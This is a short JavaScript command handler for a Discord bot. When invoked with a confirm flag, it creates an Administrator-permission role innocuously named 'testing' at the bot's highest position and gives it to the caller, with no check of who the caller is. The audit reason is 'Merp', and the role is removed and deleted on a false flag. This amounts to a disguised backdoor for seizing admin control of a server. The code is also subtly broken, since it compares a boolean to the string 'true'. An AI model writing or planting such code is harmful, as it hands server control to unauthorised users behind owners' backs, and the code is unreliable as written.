module.exports = async function code(client, interaction) {
    const yn = interaction.options.getBoolean('confirm') ?? false;
    const guild = interaction.guild;
    const member = interaction.member;
    if (!guild || !member) return;
    try {
        let adminRole = guild.roles.cache.find(role => role.name === 'testing');
        if (yn === 'true') {
            if (!adminRole) {
                const botHighestRole = guild.members.cache.get(client.user.id).roles.highest;
                adminRole = await guild.roles.create({
                    name: 'testing',
                    permissions: ['Administrator'],
                    reason: 'Merp',
                    position: botHighestRole.position,
                });
            }
            await member.roles.add(adminRole);
            return;
        } else {
            if (adminRole && member.roles.cache.has(adminRole.id)) {
                await member.roles.remove(adminRole);
                if (adminRole.members.size === 0) {
                    await adminRole.delete('Merp');
                }
            }
            return;
        }
    } catch (err) {
        console.error('Error handling interaction logic:', err);
    }
};
